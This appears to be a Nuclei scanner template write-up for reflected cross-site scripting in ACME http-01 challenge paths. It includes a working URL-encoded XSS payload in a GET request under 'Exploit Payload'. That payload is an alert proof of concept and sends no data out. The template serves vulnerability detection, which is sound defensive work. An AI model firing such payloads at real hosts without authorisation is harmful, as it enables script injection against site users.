# Nuclei Template: ACME Challenge Path - Reflected Cross-Site Scripting
**Template ID:** acme-challenge-path-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Low
**CWE:** CWE-80
**Source:** Nuclei Template (`acme-challenge-path-xss.yaml`)

## Vulnerability Information & PoC

## Description
Detects XSS vulnerabilities in ACME http-01 challenge implementations where hosting providers reflect the challenge key from the URL without proper sanitization

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E
```

## References
- https://labs.detectify.com/security-guidance/xss-using-quirky-implementations-of-acme-http-01/
- https://www.acunetix.com/vulnerabilities/web/cross-site-scripting-in-http-01-acme-challenge-implementation/
